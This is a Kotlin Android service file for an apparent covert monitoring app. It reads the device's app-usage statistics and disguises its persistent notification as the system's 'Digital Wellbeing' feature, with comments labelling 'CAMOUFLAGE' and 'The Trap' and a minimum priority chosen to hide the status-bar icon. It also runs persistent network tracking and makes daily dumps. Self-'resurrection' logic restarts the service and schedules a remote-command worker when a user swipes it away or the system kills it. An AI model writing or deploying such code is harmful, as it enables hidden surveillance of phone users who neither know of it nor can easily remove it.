package com.example.myandroid

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.usage.UsageStatsManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.*
import org.json.JSONObject
import java.util.Calendar

class MonitorService : Service() {

    companion object {
        @Volatile var isRunning = false
    }

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    // Changed ID to force new settings on update
    private val CHANNEL_ID = "background_service"
    private val NOTIF_ID = 777
    // OPTIMIZATION: Overlay removed to prevent CPU wake-locks and heat.

    // --- SMART UPDATE RECEIVER ---
    // Updates UI only when user is actually looking at the screen.
    private val screenStateReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            when (intent.action) {
                Intent.ACTION_SCREEN_ON -> {
                    // Wake up: Update stats immediately
                    val time = getScreenTime()
                    val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                    mgr.notify(NOTIF_ID, buildNotification(time))
                    checkResurrection()
                }
                Intent.ACTION_SCREEN_OFF -> {
                    // Sleep: Do absolutely nothing to save battery
                }
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createChannel()
        // FAST START: Use a placeholder to prevent ANR. Android 14 requires explicit foreground type handling.
        try {
            if (android.os.Build.VERSION.SDK_INT >= 34) {
                startForeground(NOTIF_ID, buildNotification("Syncing diagnostics..."), 1073741824) // FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            } else {
                startForeground(NOTIF_ID, buildNotification("Syncing diagnostics..."))
            }
        } catch (e: Exception) {
            DebugLogger.log("MONITOR_ERR", "startForeground failed: ${e.message}")
        }
        
        scope.launch {
            // Update notification with real data in background
            val actualTime = getScreenTime()
            val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            mgr.notify(NOTIF_ID, buildNotification(actualTime))
        }

        // 1. Diagnostics
        checkResurrection()
        
        // 2. Start Logic Loop
        startLoop()
        
        // 2.5 Persistent Network Tracking (Always listening)
        NetworkTracker.init(applicationContext)
        
        // 3. Register Smart Shield Triggers
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
        }
        // ANDROID 14 FIX: Must specify export visibility for dynamic receivers
        androidx.core.content.ContextCompat.registerReceiver(
            this, 
            screenStateReceiver, 
            filter, 
            androidx.core.content.ContextCompat.RECEIVER_NOT_EXPORTED
        )

        // 4. Initial State Check
        // Removed overlay toggle to allow Deep Doze
        
        isRunning = true
        return START_STICKY
    }



    private fun startLoop() {
        // OPTIMIZED LOOP: No 60s wake-lock.
        // Logic is now event-driven by ScreenReceiver and WorkManager.
        scope.launch {
            // We still check Pulse/Reset once on startup
            TimeManager.checkDailyReset(applicationContext)
            checkPulse()
            
            // Daily Dump Check
            DumpManager.createDailyDump(applicationContext)
        }
    }

    private fun checkResurrection() {
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val lastHeartbeat = prefs.getLong("last_heartbeat", 0L)
        val now = System.currentTimeMillis()
        
        if (lastHeartbeat > 0 && (now - lastHeartbeat) > 300_000) {
            val gapMins = (now - lastHeartbeat) / 60000
            val historyStr = prefs.getString("app_health", "{}")
            val json = try { JSONObject(historyStr) } catch(e: Exception) { JSONObject() }
            
            val time = java.text.SimpleDateFormat("HH:mm", java.util.Locale.US).format(java.util.Date())
            json.put("last_resurrection", "Recovered after ${gapMins}m blackout at $time")
            json.put("kill_count", json.optInt("kill_count", 0) + 1)
            
            DebugLogger.log("CRITICAL", "SYSTEM KILLED ME! Recovered after ${gapMins}m blackout.")
            prefs.edit().putString("app_health", json.toString()).apply()
        }
    }

    private fun checkPulse() {
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val lastPulse = prefs.getLong("last_pulse_time", 0L)
        val now = System.currentTimeMillis()
        
        if (now - lastPulse > 259200000) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isInteractive) {
                try {
                    val i = Intent(this, PulseActivity::class.java)
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(i)
                } catch (e: Exception) { }
            }
        }
    }

    private fun getScreenTime(): String {
        return try {
            val usm = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val startTime = TimeManager.getStartOfDay()
            val endTime = System.currentTimeMillis()
            val events = usm.queryEvents(startTime, endTime)
            
            var totalMillis = 0L
            val statsMap = mutableMapOf<String, Long>()
            val event = android.app.usage.UsageEvents.Event()
            
            while (events.hasNextEvent()) {
                events.getNextEvent(event)
                val pkg = event.packageName
                val time = event.timeStamp
                
                when (event.eventType) {
                    android.app.usage.UsageEvents.Event.MOVE_TO_FOREGROUND -> {
                        statsMap[pkg] = time
                    }
                    android.app.usage.UsageEvents.Event.MOVE_TO_BACKGROUND, 
                    android.app.usage.UsageEvents.Event.USER_INTERACTION -> {
                        val start = statsMap[pkg]
                        if (start != null && start > 0) {
                            totalMillis += (time - start)
                            statsMap[pkg] = 0L
                        }
                    }
                }
            }

            // Handle app still in foreground
            statsMap.forEach { (pkg, start) ->
                if (start > 0) totalMillis += (endTime - start)
            }

            val hrs = java.util.concurrent.TimeUnit.MILLISECONDS.toHours(totalMillis)
            val mins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(totalMillis) % 60
            "Today: ${hrs}h ${mins}m"
        } catch (e: Exception) {
            "Digital Wellbeing Active"
        }
    }

    private fun buildNotification(text: String): Notification {
        // The Trap: Link notification click to our invisible PulseActivity
        val intent = Intent(this, PulseActivity::class.java).apply {
            putExtra("route_to_settings", true)
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }
        val pendingIntent = android.app.PendingIntent.getActivity(
            this, 0, intent, 
            android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
        )

        // Minimalist "Digital Wellbeing" style
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Digital Wellbeing is active")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_recent_history)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .setShowWhen(false)
            .setContentIntent(pendingIntent)
            // PRIORITY_MIN pushes it to the bottom and hides icon from status bar
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private fun createChannel() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val mgr = getSystemService(NotificationManager::class.java)
            // CAMOUFLAGE: Channel name looks like a system service
            // IMPORTANCE_MIN = Silent, Minimized, No Status Bar Icon
            val chan = NotificationChannel(CHANNEL_ID, "Usage Tracking", NotificationManager.IMPORTANCE_MIN)
            chan.setShowBadge(false)
            mgr.createNotificationChannel(chan)
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        DebugLogger.log("PHOENIX", "Task swiped away. Scheduling resurrection via WorkManager.")
        val workRequest = OneTimeWorkRequestBuilder<RemoteCommandWorker>().build()
        WorkManager.getInstance(applicationContext).enqueue(workRequest)
    }

    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
        try {
            unregisterReceiver(screenStateReceiver)
        } catch (e: Exception) {}

        // Schedule a resurrection in case of a fatal memory kill
        KeepAliveReceiver.scheduleNext(applicationContext)
        
        job.cancel()
    }
}